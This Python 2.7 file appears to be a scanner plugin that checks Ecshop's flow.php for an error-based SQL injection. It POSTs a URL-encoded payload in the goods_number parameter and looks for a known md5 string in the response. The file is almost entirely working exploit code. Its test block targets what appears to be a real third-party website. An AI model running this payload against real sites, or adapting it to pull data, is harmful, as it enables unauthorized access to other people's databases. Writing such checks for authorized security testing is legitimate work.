#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Ecshop flow.php SQL Injection',
	'AUTHOR':'wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'ecshop flow.php SQL Injection '
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Ecshop':
			return True
	return False

def Audit(services):
	url = services['url'] +'/flow.php?step=update_cart'
	post_data = {'goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1+%23%5D':'1','submit':'exp'}
	try:
		ul = requests.post(url,data=post_data)
		if '63e1f04640e83605c1d177544a5a0488' in ul.text:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
